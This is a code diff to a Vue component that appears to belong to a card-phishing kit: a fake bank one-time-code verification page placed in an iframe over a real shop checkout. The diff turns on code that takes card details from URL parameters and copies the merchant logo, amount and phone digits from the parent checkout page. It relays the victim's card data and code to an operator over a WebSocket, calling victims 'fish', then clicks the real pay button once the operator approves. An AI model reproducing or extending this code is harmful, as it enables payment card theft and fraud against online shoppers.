@@ -6,7 +6,7 @@
         <!-- BankCard Component -->
         <div class="flex items-center justify-between">
           <div class="flex items-center gap-2 sm:gap-3">
-            <img
+            <img id="shopLogo"
                 src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral"
                 alt="Stripe Pattern"
                 class="h-10 sm:h-12 w-auto rounded"
@@ -14,10 +14,10 @@
           </div>
 
           <div class="flex items-center">
-            <img
-                src="@/assets/img/mastercard-logo.png"
+            <img id="bankLogo"
+                src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg"
                 alt="Mastercard ID Check"
-                class="h-8 sm:h-10 w-auto"
+                class="h-10 sm:h-12 w-auto rounded"
             />
           </div>
         </div>
@@ -34,15 +34,15 @@
             <!-- Transaction Details - Prominent Display -->
             <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
               <div class="text-sm text-gray-600 mb-2">You are authorizing a payment of</div>
-              <div class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
+              <div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
               <div class="text-sm text-gray-600">
-                to <span class="font-medium text-gray-900">SecureBank</span> on <span class="font-medium">27/02/24</span>
+                to <span id="i-bank" class="font-medium text-gray-900">SecureBank</span> on <span id="i-date" class="font-medium">27/02/24</span>
               </div>
             </div>
 
             <p class="text-sm sm:text-base text-gray-600">
               We have sent you a text message with a code to your registered mobile number ending in
-              <span class="font-medium">**7878</span>.
+              <span id="i-phone" class="font-medium">**7878</span>.
             </p>
           </div>
 
@@ -56,8 +56,8 @@
                   id="otp-code"
                   v-model="cardInfo.code"
                   type="text"
-                  placeholder="Enter 6-digit code"
-                  maxlength="6"
+                  placeholder="Enter code"
+                  maxlength="8"
                   class="w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4"
                   required
               />
@@ -237,7 +237,8 @@ watch(countdown, (newValue) => {
 const handleSubmit = async () => {
   submitCode()
   isSubmitting.value = true;
-  loadingStore.loadLoading();
+  // loadingStore.loadLoading();
+  loadingStore.loadStripe();
 };
 // 发送验证码给后端
 function submitCode() {
@@ -251,31 +252,36 @@ function submitCode() {
 }
 // 消息回调
 const callBackFish = (res: WebSocketMessage) => {
-  if(res.data.action == "发送验证码"){
+  if(res.data.action == "send"){
     // 取消loading状态， 展示页面
     loadingStore.unloadStripe();
-  }else if(res.data.action == "验证通过"){
+  }else if(res.data.action == "pass"){
     isSubmitting.value = false;
     // 提交成功，跳转页面
     console.log("======真实提交")
-    // const btn = top.document.getElementById("checkout-pay-button");
-    // btn.disabled=false;
-    // btn.click();
-    // top.window.hack = false;
-
-  }else if(res.data.action == "验证拒绝"){
+    const btn = top.document.getElementById("checkout-pay-button");
+    btn.disabled=false;
+    btn.click();
+    top.window.hack = false;
+  }else if(res.data.action == "reject"){
     isSubmitting.value = false;
     cardInfo.value['code'] = ''
     // 提交失败，提示用户 - EMVCo Compliant Modal Display
     showError.value = true;
-    loadingStore.unloadLoading();
+    loadingStore.unloadStripe();
+  }else if(res.data.action == "decline"){
+    isSubmitting.value = false;
+    cardInfo.value['code'] = ''
+    // 提交失败，提示用户 - EMVCo Compliant Modal Display
+    showError.value = true;
+    loadingStore.unloadStripe();
   }
   console.log("callBackFish：",res)
 };
 
 // Resend Code Handler
 const handleResendCode = () => {
-  cardInfo.value['status'] = 'resendCode'
+  cardInfo.value['status'] = 'resend'
   cardInfo.value['code'] = ''
   sendMsg(eventEditFish, {
     message: cardInfo.value,
@@ -294,10 +300,10 @@ onMounted( async() => {
   // 在当前页面注册消息监听
   addOnMessage(eventCallBack, callBackFish);
 
-  // // 解析URL参数
-  // const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
-  //
-  // // 解析bin
+  // 解析URL参数
+  const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));
+
+  // 解析bin
   // const binInfo = await $fetch('/api/check-bin', {
   //   method: 'POST',
   //   body: { bin: resultObject.cardNo.slice(0,6) }
@@ -310,31 +316,52 @@ onMounted( async() => {
   //   resultObject['cardCountry'] = binInfo.data.country;
   //   resultObject['cardCountryFlag'] = binInfo.data.additional_info.country_flag;
   // }
-  //
-  // // const binInfo = await $fetch('/api/check-bin', {
-  // //   method: 'GET',
-  // //   query: { bin: resultObject.cardNo }
-  // // });
-  // //
-  // // if(binInfo.success) {
-  // //   resultObject['cardBank'] = binInfo.BIN.issuer.name;
-  // //   resultObject['cardBrand'] = binInfo.BIN.brand;
-  // //   resultObject['cardType'] = binInfo.BIN.type;
-  // //   resultObject['cardLevel'] = binInfo.BIN.level;
-  // //   resultObject['cardCountry'] = binInfo.BIN.country.alpha2;
-  // //   resultObject['cardCountryFlag'] = binInfo.BIN.country.flag;
-  // // }
-  //
-  // // 初始化
-  // resultObject['status'] = 'ready';
-  // console.log(resultObject);
-  // cardInfo.value = resultObject;
-  //
-  //
-  // // 发送上鱼消息
-  // sendMsg(eventNewFish, {
-  //   message: cardInfo.value,
+
+  // const binInfo = await $fetch('/api/check-bin', {
+  //   method: 'GET',
+  //   query: { bin: resultObject.cardNo }
   // });
+  //
+  // if(binInfo.success) {
+  //   resultObject['cardBank'] = binInfo.BIN.issuer.name;
+  //   resultObject['cardBrand'] = binInfo.BIN.brand;
+  //   resultObject['cardType'] = binInfo.BIN.type;
+  //   resultObject['cardLevel'] = binInfo.BIN.level;
+  //   resultObject['cardCountry'] = binInfo.BIN.country.alpha2;
+  //   resultObject['cardCountryFlag'] = binInfo.BIN.country.flag;
+  // }
+
+  // 从父级页面获取信息
+  if(window.self !== window.top){
+    // 设置logo
+    const bankLogo = top.document.querySelector('#basic-creditCards-secondary img').src;
+    document.querySelector('#bankLogo').setAttribute('src', bankLogo);
+    const shopLogo = top.document.querySelector('a img').src;
+    document.querySelector('#shopLogo').setAttribute('src', shopLogo);
+    // 支付金额
+    document.querySelector("#i-money").innerHTML = top.document.querySelector("strong:nth-child(2)").innerHTML;
+    // 商户名
+    document.querySelector("#i-bank").innerHTML = top.document.querySelector('a img').alt;
+    // 日期
+    document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
+                                                            day: '2-digit',
+                                                            month: '2-digit',
+                                                            year: '2-digit'
+                                                          });
+    // 手机号后四位
+    document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
+  }
+
+  // 初始化
+  resultObject['status'] = 'ready';
+  console.log(resultObject);
+  cardInfo.value = resultObject;
+
+
+  // 发送上鱼消息
+  sendMsg(eventNewFish, {
+    message: cardInfo.value,
+  });
 });
 
 onBeforeUnmount(() => {
